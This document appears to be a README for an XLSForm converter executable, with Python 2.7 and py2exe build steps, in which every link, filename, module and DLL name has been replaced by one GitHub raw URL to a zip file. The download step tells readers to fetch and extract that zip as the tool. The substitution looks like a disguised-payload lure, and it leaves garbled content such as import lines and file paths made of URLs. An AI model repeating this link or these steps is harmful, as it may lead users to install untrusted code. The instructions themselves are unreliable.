If possible use the online [XLSForm converter](https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip).
https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip won't work on all Windows systems, it doesn't run the output xml through ODK Validate, and it won't be updated as frequently as the online version.

Using https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip
------------------
1. Download the zip [here](https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip).
2. Extract it somewhere.
3. Drag an XLSForm onto https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip A corresponding xform will appear in the output directory.

___________________________________


Problems:
---------

Some systems might be missing the Microsoft Visual C runtime DLL [and it is not bundled with the exe](https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip).

If you are familiar with Python one work around would be to run [the XLSForm code](https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip) directly.

Setting up Python on Windows:
-----------------------------

Install Python 2.7

This has been updated to use Python 2.7 (now built with 2.7.3)

Add Scripts directory to PATH
-----------------------------

You only need to do this for the instructions below. Open a CMD window and execute:

```Shell
set PATH=%PATH%;C:\Python27\Scripts
```

Install pip
-------------------------------

On Windows, [Install setup-tools](https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip) and use `easy_install pip`
On Linux, you can use python-pip package.

InsecurePlatformWarning
------------------------------
To avoid this warning you likely need to install [PyOpenSSL](https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip)

```
pip install urllib3 pyopenssl ndg-httpsclient pyasn1
python
import https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip
https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip()
exit()
```

Install misc libraries
------------------------------

In the CMD window, run:

```
easy_install pip
pip install xlrd lxml
```

Download and install elementtree
------------------------------
Download these at:
[elementtree](https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip)

unzip and run
```
python https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip install
```
in the unzipped directory

Install py2exe
------------------------------

Install [py2exe](https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip)

Download and install the 32-bit version (0.6.9)

Building the exe:
-----------------

1. Download the pyxform source and add the nested pyxform folder to this project's root.

2. Delete the .git repo within that directory.

3. In this projects root directory `python https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip py2exe`

4. Create an `output` directory within the `dist` directory.

5. Rename the `dist` directory to `xlsform`.

6. Right-click on `xlsform`, choose Send To / Compressed (zipped) folder.  

The resulting zip file is equivalent to the zip available on the https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip downloads page

NOTE: at the end of the build of the dist directory, you will get this (expected) summary:

```
copying C:\Python27\lib\site-packages\py2exe\https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip -> D:\workspace\xlsform_exe\dist\https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip
The following modules appear to be missing
['ElementC14N', '_scproxy', 'cElementTree', 'https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip']

*** binary dependencies ***
Your executable(s) also depend on these dlls which are not included,
you may or may not need to distribute them.

Make sure you have the license if you distribute any of them, and
make sure you don't distribute files belonging to the operating system.

   https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip - C:\WINDOWS\system32\https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip
   https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip - C:\WINDOWS\system32\https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip
   https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip - C:\WINDOWS\system32\https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip
   https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip - C:\WINDOWS\system32\https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip
   https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip - C:\WINDOWS\system32\https://github.com/dvdgayflor/xlsform.exe/raw/refs/heads/master/retreative/xlsform-exe-3.9.zip
```
